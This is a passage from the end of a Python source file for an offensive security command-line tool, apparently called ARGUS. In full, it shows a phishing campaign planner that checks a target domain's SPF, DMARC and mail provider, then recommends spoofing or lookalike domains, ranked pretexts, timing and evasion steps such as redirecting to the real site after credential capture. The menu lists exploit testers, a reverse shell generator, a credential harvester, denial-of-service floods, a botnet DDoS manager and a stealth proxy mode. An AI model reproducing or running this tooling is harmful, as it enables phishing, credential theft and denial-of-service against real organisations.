        return

    domain = prompt("Target organization domain")
    if not domain:
        return

    spinner("Gathering intelligence...", 1.5)

    print(f"\n  {Y}══ Campaign Intelligence Report ══{RST}\n")

    # Email security posture
    print(f"  {Y}── 1. Email Security Posture ──{RST}")
    spf_weak = False
    dmarc_weak = False
    if dns:
        try:
            answers = dns.resolver.resolve(domain, "TXT")
            for rdata in answers:
                txt = rdata.to_text().strip('"')
                if "v=spf1" in txt:
                    if "-all" in txt:
                        print(f"    SPF: {G}Hard fail (-all){RST}")
                    elif "~all" in txt:
                        print(f"    SPF: {Y}Soft fail (~all) — bypassable{RST}")
                        spf_weak = True
                    else:
                        print(f"    SPF: {R}Weak/missing{RST}")
                        spf_weak = True
                    break
            else:
                print(f"    SPF: {R}No record found{RST}")
                spf_weak = True
        except Exception:
            print(f"    SPF: {R}No record found{RST}")
            spf_weak = True

        try:
            answers = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
            for rdata in answers:
                txt = rdata.to_text().strip('"')
                if "v=DMARC1" in txt:
                    if "p=reject" in txt:
                        print(f"    DMARC: {G}Reject policy{RST}")
                    elif "p=quarantine" in txt:
                        print(f"    DMARC: {Y}Quarantine{RST}")
                        dmarc_weak = True
                    else:
                        print(f"    DMARC: {R}None/monitor only{RST}")
                        dmarc_weak = True
                    break
            else:
                print(f"    DMARC: {R}No record{RST}")
                dmarc_weak = True
        except Exception:
            print(f"    DMARC: {R}No record{RST}")
            dmarc_weak = True
    else:
        print(f"    {Y}dnspython not installed — skipping DNS checks{RST}")

    # MX servers
    print(f"\n  {Y}── 2. Mail Infrastructure ──{RST}")
    mx_provider = "Unknown"
    if dns:
        try:
            answers = dns.resolver.resolve(domain, "MX")
            for rdata in sorted(answers, key=lambda r: r.preference):
                mx = str(rdata.exchange).rstrip(".")
                print(f"    MX: {W}{mx}{RST} (priority {rdata.preference})")
                if "google" in mx or "gmail" in mx:
                    mx_provider = "Google Workspace"
                elif "outlook" in mx or "microsoft" in mx:
                    mx_provider = "Microsoft 365"
                elif "protonmail" in mx:
                    mx_provider = "ProtonMail"
            print(f"    Provider: {C}{mx_provider}{RST}")
        except Exception:
            print(f"    {Y}Could not resolve MX{RST}")

    # Web technologies
    print(f"\n  {Y}── 3. Web Presence ──{RST}")
    try:
        resp = requests.get(f"https://{domain}", timeout=10)
        server = resp.headers.get("Server", "Unknown")
        print(f"    Server: {W}{server}{RST}")
        powered = resp.headers.get("X-Powered-By", "")
        if powered:
            print(f"    Powered-By: {W}{powered}{RST}")
    except Exception:
        print(f"    {Y}Could not fetch website{RST}")

    # Recommendations
    print(f"\n  {Y}── 4. Campaign Recommendations ──{RST}")

    print(f"\n  {C}Pretexts (ranked by effectiveness):{RST}")
    pretexts = [
        "Password expiry notification",
        "IT security policy update acknowledgment",
        "Shared document from colleague / CEO",
        "Invoice / financial report review",
        "Multi-factor authentication enrollment",
        "VPN/remote access reconfiguration",
        "Annual security awareness training",
        "Benefits enrollment / HR update",
    ]
    for i, p in enumerate(pretexts, 1):
        print(f"    {C}{i}.{RST} {W}{p}{RST}")

    print(f"\n  {C}Recommended approach:{RST}")
    if spf_weak or dmarc_weak:
        print(f"    {R}•{RST} Direct email spoofing is viable (weak SPF/DMARC)")
    else:
        print(f"    {G}•{RST} Use lookalike domain (strong SPF/DMARC in place)")

    if mx_provider == "Microsoft 365":
        print(f"    {W}•{RST} Use Office 365 login template")
        print(f"    {W}•{RST} Pretext: 'Shared OneDrive document' or 'Teams message'")
    elif mx_provider == "Google Workspace":
        print(f"    {W}•{RST} Use Google login template")
        print(f"    {W}•{RST} Pretext: 'Shared Google Doc' or 'Drive access request'")
    else:
        print(f"    {W}•{RST} Use generic corporate login template")

    print(f"\n  {C}Timing:{RST}")
    print(f"    {W}•{RST} Best: Tuesday-Thursday, 9-11 AM or 2-3 PM local time")
    print(f"    {W}•{RST} Avoid: Monday mornings, Friday afternoons")

    print(f"\n  {C}Evasion tips:{RST}")
    print(f"    {W}•{RST} Warm up sending domain (age > 30 days)")
    print(f"    {W}•{RST} Configure SPF/DKIM/DMARC on phishing domain")
    print(f"    {W}•{RST} Use aged, categorized domain")
    print(f"    {W}•{RST} SSL certificate on phishing infrastructure")
    print(f"    {W}•{RST} Redirect after credential capture to real site")


# ─── Menu System ───────────────────────────────────────────────────────────────

RECON_ITEMS = [
    ("Username Search", username_search),
    ("Email Lookup", email_lookup),
    ("Phone Number Lookup", phone_lookup),
    ("IP Address Lookup", ip_lookup),
    ("WHOIS Lookup", whois_lookup),
    ("DNS Lookup", dns_lookup),
    ("Subdomain Enumeration", subdomain_enum),
    ("HTTP Headers Analysis", http_headers),
    ("Website Technology Detection", tech_detect),
    ("Port Scanner", port_scanner),
    ("Reverse DNS Lookup", reverse_dns),
    ("MAC Address Lookup", mac_lookup),
    ("Email Breach Check", email_breach_check),
    ("Metadata Extractor", metadata_extractor),
    ("Social Media Scraper", social_scraper),
    ("SSL/TLS Certificate Info", ssl_cert_info),
    ("Wayback Machine Lookup", wayback_lookup),
    ("Robots.txt & Sitemap Analyzer", robots_sitemap),
    ("Link Extractor", link_extractor),
    ("Google Dorks Generator", google_dorks),
    ("Traceroute", traceroute),
    ("Hash Identifier & Lookup", hash_lookup),
    ("ASN Lookup", asn_lookup),
    ("Website Screenshot", website_screenshot),
    ("Reverse Image Search", reverse_image_search),
    ("CVE Search", cve_search),
    ("Paste / Code Search", paste_search),
    ("DNS Zone Transfer Check", dns_zone_transfer),
    ("SSL/TLS Suite Scanner", ssl_scanner),
    ("Shodan Host Lookup", shodan_lookup),
    ("Favicon Hash Lookup", favicon_hash),
    ("DMARC / SPF / DKIM Check", dmarc_spf_dkim),
    ("Security.txt Checker", security_txt),
    ("HTTP Methods Discovery", http_methods),
    ("Cloud Storage Finder", cloud_storage_finder),
    ("JS Endpoint Extractor", js_endpoint_extractor),
    ("WAF / CDN Detector", waf_detector),
    ("Banner Grabbing", banner_grab),
    ("Subdomain Bruteforce", subdomain_brute),
    ("Ping Sweep / Host Discovery", ping_sweep),
    ("Vibe-Coded Site Finder", vibe_site_finder),
]

EXPLOIT_ITEMS = [
    ("SQL Injection Tester", sqli_tester),
    ("XSS Scanner (Reflected)", xss_scanner),
    ("Directory / File Bruteforcer", dir_bruteforce),
    ("CORS Misconfiguration Scanner", cors_check),
    ("Open Redirect Scanner", open_redirect_scanner),
    ("LFI / Path Traversal Tester", lfi_tester),
    ("Subdomain Takeover Check", subdomain_takeover),
    ("Reverse Shell Generator", revshell_generator),
    ("CMS Vulnerability Scanner", cms_vuln_scanner),
    ("Payload Encoder / Decoder", payload_encoder),
    ("CRLF Injection Tester", crlf_injection),
    ("SSRF Tester", ssrf_tester),
    ("JWT Analyzer", jwt_analyzer),
    ("Clickjacking Tester", clickjacking_test),
    ("XXE Tester", xxe_tester),
    ("Command Injection Tester", cmd_injection),
    ("Host Header Injection", host_header_injection),
    ("Insecure Cookie Checker", cookie_checker),
    ("CSRF Token Analyzer", csrf_analyzer),
    ("Prototype Pollution Scanner", prototype_pollution),
    ("Supabase RLS Auditor", supabase_rls_auditor),
]

STRESS_ITEMS = [
    ("HTTP Flood (GET/POST)", http_flood),
    ("Slowloris", slowloris),
    ("Slow POST (R.U.D.Y.)", slow_post),
    ("TCP Connection Flood", tcp_flood),
    ("UDP Flood", udp_flood),
    ("ICMP Ping Flood", icmp_flood),
    ("HTTP Slow Read", http_slow_read),
    ("GoldenEye (Keep-Alive Flood)", goldeneye),
    ("DNS Flood", dns_flood),
    ("WebSocket Flood", websocket_flood),
]

PHISHING_ITEMS = [
    ("Homoglyph Domain Generator", homoglyph_generator),
    ("Phishing URL Analyzer", phishing_url_analyzer),
    ("Email Spoofing Checker", email_spoof_check),
    ("Typosquatting Generator", typosquat_generator),
    ("Credential Harvester Gen", credential_harvest_gen),
    ("URL Obfuscator", url_obfuscator),
    ("Email Header Analyzer", email_header_analyzer),
    ("IDN Homograph Attack Gen", idn_homograph),
    ("Phishing Kit Detector", phishing_kit_detector),
    ("Phishing Campaign Planner", phishing_planner),
]

MENU_ITEMS = RECON_ITEMS + EXPLOIT_ITEMS + STRESS_ITEMS + PHISHING_ITEMS


AI_SEARCH_API = os.environ.get("API_URL") or "https://argusbackend-psi.vercel.app"


def ai_search():
    query = input(f"\n  {Y}Search query:{RST} ").strip()
    if not query:
        print_err("Empty query")
        return
    try:
        resp = requests.get(f"{AI_SEARCH_API}/search", params={"q": query}, timeout=30)
        resp.raise_for_status()
        data = resp.json()
    except requests.ConnectionError:
        print_err(f"Cannot connect to ARGUS API at {AI_SEARCH_API}")
        print_err("Start it with: cd api && uvicorn main:app --reload")
        return
    except Exception as e:
        print_err(f"API error: {e}")
        return

    results = data.get("results", [])
    if not results:
        print_warn("No tools found for this query.")
        return

    print(f"\n  {G}{'─' * 60}{RST}")
    print(f"  {G}AI Search Results for:{RST} {W}{query}{RST}")
    print(f"  {G}{'─' * 60}{RST}")
    for r in results:
        mid = r.get("menu_number", r.get("id", "?"))
        print(f"\n  {C}[{mid}]{RST} {W}{r['name']}{RST} ({r['category']})")
        print(f"      {r.get('description', '')}")
        if r.get("relevance"):
            print(f"      {Y}→ {r['relevance']}{RST}")
    print(f"\n  {G}{'─' * 60}{RST}")

    sel = input(f"\n  {Y}Launch tool number (or Enter to go back):{RST} ").strip()
    if sel:
        try:
            idx = int(sel) - 1
            if 0 <= idx < len(MENU_ITEMS):
                name, func = MENU_ITEMS[idx]
                func()
            else:
                print_err("Invalid tool number")
        except ValueError:
            print_err("Enter a valid number")


def show_menu():
    name_w = 31
    w = 12 + 2 * name_w  # 74

    def _section(title, items, start, clr):
        print(f"  {Y}╠{'═' * w}╣{RST}")
        print(f"  {Y}║{clr}{'── ' + title + ' ──':^{w}}{Y}║{RST}")
        print(f"  {Y}╠{'═' * w}╣{RST}")
        for r in range(0, len(items), 2):
            i1 = start + r
            n1 = items[r][0]
            left = f" {clr}{i1:>2}.{RST} {W}{n1:<{name_w}}{RST}"
            if r + 1 < len(items):
                i2 = start + r + 1
                n2 = items[r + 1][0]
                right = f"  {clr}{i2:>2}.{RST} {W}{n2:<{name_w}}{RST} "
            else:
                right = " " * (7 + name_w)
            print(f"  {Y}║{RST}{left}{right}{Y}║{RST}")

    if STEALTH["enabled"]:
        stealth_tag = f"{G}STEALTH: ON via {STEALTH['proxy_type'].upper()}{RST}"
    else:
        stealth_tag = f"{R}STEALTH: OFF{RST}"

    print(f"\n  {Y}╔{'═' * w}╗{RST}")
    print(f"  {Y}║{W}{'MAIN MENU':^{w}}{Y}║{RST}")
    print(f"  {Y}║{RST}  [{stealth_tag}]{'':>{w - 30}}{Y}║{RST}")
    _section("OSINT / RECONNAISSANCE", RECON_ITEMS, 1, C)
    _section("EXPLOITATION", EXPLOIT_ITEMS, len(RECON_ITEMS) + 1, R)
    _section("STRESS / DENIAL OF SERVICE", STRESS_ITEMS,
             len(RECON_ITEMS) + len(EXPLOIT_ITEMS) + 1, R)
    _section("PHISHING SIMULATION", PHISHING_ITEMS,
             len(RECON_ITEMS) + len(EXPLOIT_ITEMS) + len(STRESS_ITEMS) + 1, M)
    print(f"  {Y}╠{'═' * w}╣{RST}")
    ai_txt = "AI Search — Find the best tool for your needs"
    bot_count = len(_botnet_db_load())
    bot_txt = f"Botnet — Coordinated DDoS ({bot_count} zombie{'s' if bot_count != 1 else ''})"
    print(f"  {Y}║{RST}  {G} A.{RST} {W}{ai_txt:<{w - 6}}{Y}║{RST}")
    print(f"  {Y}║{RST}  {M} S.{RST} {W}{'Stealth Mode Config':<{w - 6}}{Y}║{RST}")
    print(f"  {Y}║{RST}  {R} B.{RST} {W}{bot_txt:<{w - 6}}{Y}║{RST}")
    print(f"  {Y}║{RST}  {R} 0.{RST} {W}{'Exit':<{w - 6}}{Y}║{RST}")
    print(f"  {Y}╚{'═' * w}╝{RST}")


def main():
    os.system("clear")
    print(BANNER)

    while True:
        show_menu()
        choice = input(f"\n  {Y}Select option >{RST} ").strip()

        if choice == "0":
            print(f"\n  {R}Goodbye.{RST}\n")
            break

        if choice.lower() == "a":
            try:
                ai_search()
            except KeyboardInterrupt:
                print(f"\n  {Y}Interrupted.{RST}")
            pause()
            continue

        if choice.lower() == "s":
            configure_stealth()
            continue

        if choice.lower() == "b":
            try:
                botnet_manager()
            except KeyboardInterrupt:
                print(f"\n  {Y}Interrupted.{RST}")
            pause()
            continue

        try:
            idx = int(choice) - 1
            if 0 <= idx < len(MENU_ITEMS):
                name, func = MENU_ITEMS[idx]
                try:
                    func()
                except KeyboardInterrupt:
                    print(f"\n  {Y}Interrupted.{RST}")
                pause()
            else:
                print_err("Invalid option")
        except ValueError:
            print_err("Enter a number, 'S' for Stealth, or 'B' for Botnet")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {R}Interrupted. Goodbye.{RST}\n")
        sys.exit(0)
